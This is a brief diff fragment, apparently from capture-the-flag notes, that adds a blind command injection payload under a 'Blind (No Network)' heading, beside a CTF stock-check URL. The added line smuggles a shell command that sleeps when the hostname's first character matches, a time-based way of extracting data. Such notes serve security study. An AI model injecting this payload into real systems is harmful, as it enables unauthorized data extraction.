@@ -35,3 +35,7 @@ https://ey8u7q46.eu1.ctfio.com/stock-check.php?id=f3d1426d-16af-4243-a148-d7c874
 
 # Blind (No Network)
 
+```
+; if [ $(hostname | cut -c 1-1) = "0" ]; then sleep 10; fi
+```
+
